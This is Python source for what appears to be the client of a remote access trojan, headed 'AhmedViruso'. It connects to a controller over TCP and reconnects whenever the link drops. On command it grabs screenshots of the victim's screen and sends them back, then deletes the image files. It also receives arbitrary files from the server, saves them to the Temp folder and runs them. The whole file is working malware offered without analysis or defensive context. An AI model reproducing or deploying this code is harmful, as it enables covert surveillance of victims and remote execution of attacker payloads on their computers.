# Python 3
# AhmedViruso

try:
    import socket,os,time,random,string
    from PIL import ImageGrab
except:
	exit()

def Create(): # Create Tcp Socket
    global Ip
    global Port
    global S

    try:
        
        Ip = '127.0.0.1'
        Port = 519

        S = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    except:
        time.sleep(3)
        Create()

def Connect(): # Connect To Socket

    try:

        S.connect((Ip, Port))

    except:
    	time.sleep(3)
    	Connect()


def RandomSg():

	Random = string.ascii_uppercase + string.digits # Random String Settings

	Random = ''.join(random.sample(Random*6, 6)) # Random String

	return Random


def ExecuteOrders():

    while True:

        try: # Check If Server is online

            Data = S.recv(1024)

            Data = Data.decode("utf-8")

            Temp = os.getenv('Temp') # Get Temp Path

        except: # Reconnect

            Main()

            continue

        if(Data == 'screen'): 

            try:

            	Snapshot = ImageGrab.grab() # Taking Screenshot

            	Path = Temp+"/"+RandomSg()+".jpg" # Path to save screenshot

            	Snapshot.save(Path) # Save screenshot

            	with open(Path,"rb") as F:

                    Data = F.read() # Read File Bytes

                    S.sendall(Data) # Send the Screenshot
                        

            	F.close() # Close The File
            	
            	os.remove(Path) # Delete Screenshot after sending it to server

            except:

            	continue


        elif(Data == 'upload'):

            try:

            	S.send(str.encode("file"))

            	Ex = S.recv(1024).decode("utf-8") # File Extension

            	Path = Temp+"/"+RandomSg()+"."+Ex

            	try:

            		F = open(Path, "wb")
            		S.send(str.encode("truefile"))

            	except:

            		S.send(str.encode("errorfile"))
            		continue

            	while True:

                    Data = S.recv(1024) # Receive File Bytes

                    F.write(Data)

                    Check = len(Data)

                    print("Update")

                    if(1024 != Check): # If 1024 > length (Data) , Stop Loop
			
                        F.close() # Close File
                        Execute = os.system('start '+Path) # Execute File

                        if(Execute == 0):
                        	S.send(str.encode("executetrue"))

                        else:
                        	S.send(str.encode("executefalse"))

                        break

            except:
            	continue

def Main():
    
    Create()
    Connect()
    ExecuteOrders()

Main()
